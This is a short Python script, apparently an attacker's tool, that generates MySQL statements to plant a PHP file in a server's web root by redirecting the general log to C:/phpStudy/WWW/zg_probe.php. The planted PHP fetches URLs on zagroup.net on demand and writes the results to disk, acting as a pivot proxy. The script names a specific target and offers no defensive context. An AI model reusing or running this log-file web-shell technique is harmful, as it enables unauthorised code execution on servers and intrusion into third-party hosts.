#!/usr/bin/env python3
"""gen_zg_probe.py - zagroup.net SQLi探测(81.70)"""
body = '<?php $u=$_GET["u"];$ch=curl_init("http://zagroup.net/".$u);curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);curl_setopt($ch,CURLOPT_TIMEOUT,15);$r=curl_exec($ch);file_put_contents("C:/phpStudy/WWW/zg_result.txt",$r);echo "WROTE:".strlen($r);?>'

assert "'" not in body.replace("php://input", "")
sql = []
sql.append("SET GLOBAL general_log=OFF;")
sql.append("SET GLOBAL general_log_file='C:/phpStudy/WWW/zg_probe.php';")
sql.append("SET GLOBAL general_log=ON;")
sql.append("SELECT 'GIF89a%s//'" % body)
sql.append("SET GLOBAL general_log=OFF;")
with open('/tmp/zg_probe.sql', 'w') as f:
    f.write('\n'.join(sql) + '\n')
print('ready, len:', len(body))
